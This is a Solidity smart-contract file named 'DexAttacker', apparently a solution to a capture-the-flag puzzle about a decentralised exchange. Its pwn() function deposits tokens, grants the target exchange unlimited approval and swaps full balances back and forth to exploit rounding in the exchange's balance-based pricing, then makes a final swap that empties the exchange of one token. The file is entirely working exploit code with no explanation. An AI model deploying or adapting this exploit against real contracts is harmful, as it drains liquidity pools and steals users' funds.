// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface IDex {
    function token1() external view returns(address);
    function token2() external view returns(address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function allowance(address owner, address spender) external view returns (uint256);
}


contract DexAttacker {
    address public owner;
    IDex public target;

    IERC20 public token1;
    IERC20 public token2;
    
    modifier onlyOwner {
    require(msg.sender == owner);
    _;
    }
    

    constructor(address _owner, address _target, address _token1, address _token2){
        owner = _owner;
        target = IDex(_target);
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }

    function setParams(address _target, address _token1, address _token2) public onlyOwner{
        target = IDex(_target);
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }

    function getSwapPrice(address _from, address _to, uint256 _amount) external view returns (uint256) {
        return target.getSwapPrice(_from, _to, _amount);
    }

     function balanceOf(address _token, address _account) external view returns (uint256) {
        // return target.balanceOf(_token, _account);
        return IERC20(_token).balanceOf(_account);
     }

    function pwn() external {

        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        // require(token1.balanceOf(address(this)) >= 10, "Not enough token1 after transfer");
        // require(token2.balanceOf(address(this)) >= 10, "Not enough token2 after transfer");

        token1.approve(address(target), type(uint).max);
        token2.approve(address(target), type(uint).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        
        // target.swap(address(token1), address(token2), 45);
        target.swap(address(token2), address(token1), 45);
        // require(token1.balanceOf(address(target)) == 0, "Dex balance != 0");
    }

    function transferFrom(IERC20 _token, address _from, address _to, uint256 _amount) public onlyOwner {
        _token.transferFrom(_from, _to, _amount);
    }

    function _swap(IERC20 _tokenIn, IERC20 _tokenOut) private {
        target.swap(
            address(_tokenIn), 
            address(_tokenOut), 
            _tokenIn.balanceOf(address(this))
        );
    }
    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }
}